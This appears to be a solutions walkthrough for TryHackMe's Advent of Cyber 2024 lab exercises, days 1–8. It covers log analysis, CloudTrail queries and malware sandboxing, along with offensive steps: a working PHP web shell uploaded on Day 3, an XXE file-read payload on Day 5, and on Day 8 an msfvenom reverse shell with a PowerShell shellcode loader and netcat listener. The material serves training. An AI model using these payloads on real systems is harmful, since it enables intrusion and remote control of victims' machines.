# 🎄 [Advent of Cyber 2024](https://tryhackme.com/r/room/adventofcyber2024)

## OPSEC - Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

**Operational Security (OPSEC)** is a set of principals and tactics used to attempt to protect the security of an operator or operation. An example of this may be using code names instead of your real names, or using a proxy to conceal your IP address.

**Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?**

```shell
exiftool song.mp3 | grep Artist
```

**The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?**

```shell
curl -s https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 | grep "c2Url ="
```

**Who is M.M? Maybe his Github profile page would provide clues?**

Go to https://github.com/MM-WarevilleTHM/M.M

**What is the number of commits on the GitHub repo where the issue was raised?**

Go to https://github.com/MM-WarevilleTHM/IS/commits/main/

**What's with all these GitHub repos? Could they hide something else?**

* https://github.com/MM-WarevilleTHM/M.M/commits/main/ has 5 commits
* Both repos have some forks
* Other than that, nothing `¯\_(ツ)_/¯`

## Log analysis - Day 2: One man's false positive is another man's potpourri

**What is the name of the account causing all the failed login attempts?**
**How many failed logon attempts were observed?**

* Select events between "November 29 0:00" and "December 1 23:30"
* Select fields `user.name`, `event.category` and `event.outcome`
* Search/Filter by `event.category = authentication AND event.outcome = failure`

**What is the IP address of Glitch?**

* On the previous search, add field `source.ip`
* Filter by different values of `source.ip` and select the one that caused the spike

**When did Glitch successfully logon to ADM-01?**

* On the previous search ...
* Search/Filter by `event.category = authentication AND event.outcome = success AND source.ip = <Glitch IP>`

**What is the decoded command executed by Glitch to fix the systems of Wareville?**

* Select fields `event.category` and `process.command_line`
* Search/Filter by `event.category = process`
* Check `powershell.exe` executions with a `-EncodedCommand` value
* Put that value in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')&input=U1FCdUFITUFkQUJoQUd3QWJBQXRBRmNBYVFCdUFHUUFid0IzQUhNQVZRQndBR1FBWVFCMEFHVUFJQUF0QUVFQVl3QmpBR1VBY0FCMEFFRUFiQUJzQUNBQUxRQkJBSFVBZEFCdkFGSUFaUUJpQUc4QWJ3QjBBQT09)

## Log analysis - Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it

**BLUE: Where was the web shell uploaded to?**
**BLUE: What IP address accessed the web shell?**

* Select index `frostypines-resorts`
* Select events between `Oct 3, 2024 @ 11:30:00.000` and `Oct 3, 2024 @ 12:00:00.000`
* Select fields `clientip` and `request`
* Search by `message: "shell.php"`
* Select the IP that executes suspicious commands (query parameter `command`)

**RED: What is the contents of the flag.txt?**

* Execute `sudo echo "10.101.200.8 frostypines.thm" >> /etc/hosts`
* Go to http://frostypines.thm/login.php with user=admin@frostypines.thm and password=admin
* Go to http://frostypines.thm/admin/add_room.php and create a new room uploading `shell.php` as its image:
  ```html
    <html>
        <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                <input type="text" name="command" autofocus id="command" size="50">
                <input type="submit" value="Execute">
            </form>
            <pre>
            <?php
                if(isset($_GET['command'])) 
                {
                    system($_GET['command'] . ' 2>&1'); 
                }
            ?>
            </pre>
        </body>
    </html>
  ```
* Go to http://frostypines.thm/media/images/rooms/shell.php?command=ls
* Go to http://frostypines.thm/media/images/rooms/shell.php?command=cat%20flag.txt

## Atomic Red Team - Day 4: I’m all atomic inside!

**What was the flag found in the .txt file that is found in the same directory as the PhishingAttachment.xslm artefact?**

```powershell
Invoke-AtomicTest T1566.001 -TestNumbers 1
cat C:\Users\Administrator\AppData\Local\Temp\PhishingAttachment.txt
Invoke-AtomicTest T1566.001-1 -cleanup
```

**What ATT&CK technique ID would be our point of interest?**

* https://attack.mitre.org/techniques/T1059/

**What ATT&CK subtechnique ID focuses on the Windows Command Shell?**

* https://attack.mitre.org/techniques/T1059/003/

**What is the name of the Atomic Test to be simulated?**

Search for a test named "ware":
```powershell
Invoke-AtomicTest T1059.003 -ShowDetailsBrief
```

**What is the name of the file used in the test?**

Search for a txt file:
```powershell
 Invoke-AtomicTest T1059.003 -ShowDetails -TestNumbers 4
```

**What is the flag found from this Atomic Test?**

Execute the test which should print a PDF containing the flag:
```powershell
Invoke-AtomicTest T1059.003 -TestNumbers 4
```

## XXE - Day 5: SOC-mas XX-what-ee?

**What is the flag discovered after navigating through the wishes?**

POST /wishlist.php using Burp Repeater:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_15.txt"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

**What is the flag seen on the possible proof of sabotage?**

Go to http://MACHINE_IP/CHANGELOG

## Sandboxes - Day 6: If I can't find a nice malware to use, I'm not going

**What is the flag displayed in the popup window after the EDR detects the malware?**

* First execute the EDR (Endpoint Detection and Response) `C:\Tools\JingleBells.ps1`
* Then execute `C:\Tools\Malware\MerryChristmas.exe` via File Explorer

**What is the flag found in the malstrings.txt document after running floss.exe?**

```powershell
C:\Tools\FLOSS\floss.exe C:\Tools\Malware\MerryChristmas.exe | Out-file C:\Tools\malstrings.txt
Select-String -Path C:\Tools\malstrings.txt -Pattern THM
```

## AWS log analysis - Day 7: Oh, no. I'M SPEAKING IN CLOUDTRAIL!

**What is the other activity made by the user glitch aside from the ListObject action?** ➕ **What is the source IP related to the S3 bucket activities of the user glitch?**

```shell
jq -r '["User_Name", "Event_Name", "IP"],
( .Records[] 
  | select(
      .eventSource == "s3.amazonaws.com"
      and .requestParameters.bucketName=="wareville-care4wares"
      and .userIdentity.userName=="glitch"
    )
  | [.userIdentity.userName, .eventName, .sourceIPAddress]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**Based on the eventSource field, what AWS service generates the ConsoleLogin event?**

```shell
jq -r '.Records[] | select(.eventName == "ConsoleLogin") | .eventSource' \ cloudtrail_log.json | sort -u
```

**When did the anomalous user trigger the ConsoleLogin event?**

```shell
jq -r '["User_Name", "Event_Time", "IP"],
( .Records[] 
  | select(
      .eventName == "ConsoleLogin"
      and .sourceIPAddress == "53.94.201.69"
      and .userIdentity.userName == "glitch"
    )
  | [.userIdentity.userName, .eventTime, .sourceIPAddress]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**What was the name of the user that was created by the mcskidy user?**

```shell
jq -r '["User_Name", "Event_Time", "Event_Name", "User_Created"],
( .Records[] 
  | select(
      .eventName == "CreateLoginProfile"
      and .userIdentity.userName == "mcskidy"
    )
  | [.userIdentity.userName, .eventTime, .eventName, .requestParameters.userName]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**What type of access was assigned to the anomalous user?**

```shell
jq -r '["User_Name", "Event_Time", "Event_Name", "User_Updated", "Policy"],
( .Records[] 
  | select(
      .eventName == "AttachUserPolicy"
      and .userIdentity.userName == "mcskidy"
    )
  | [.userIdentity.userName, .eventTime, .eventName, .requestParameters.userName, .requestParameters.policyArn]
) | @tsv' ~/wareville_logs/cloudtrail_log.json
```

**Which IP does Mayor Malware typically use to log into AWS?**

```shell
jq -r '.Records[] | select(.userIdentity.userName == "mayor_malware") | .sourceIPAddress' \
~/wareville_logs/cloudtrail_log.json | sort -u
```

**What is McSkidy's actual IP address?**

```shell
jq -r '.Records[]
| select(
  .userIdentity.userName == "mcskidy"
  and .sourceIPAddress != "53.94.201.69"
) | .sourceIPAddress' \
~/wareville_logs/cloudtrail_log.json | sort -u
```

**What is the bank account number owned by Mayor Malware?**

```shell
cat ~/wareville_logs/rds.log | \
grep "INSERT INTO wareville_bank_transactions" | grep "Mayor Malware" | \
grep -oP "VALUES \('\K[^']+" | sort -u
```

## Shellcodes - Day 8: Shellcodes of the world, unite!

**What is the flag value once Glitch gets reverse shell on the digital vault using port 4444?**

On the AttackBox:

1) Create the shell code on the AttackBox
```shell
export ATTACKBOX_IP=x.x.x.x
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKBOX_IP LPORT=4444 -f powershell
```

2) Start the listener:
```shell
nc -nvlp 4444
```

On the Windows machine:

1) Execute:
```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
[DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
[DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread
```

2) Replace with your shell code and execute:
```powershell
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0xa,0xa,0x8b,0xf4,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5
```

3) Execute:
```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

4) Wait a minute and on the AttackBox listener or directly from the Windows machine:
```powershell
type C:\Users\glitch\Desktop\flag.txt
```
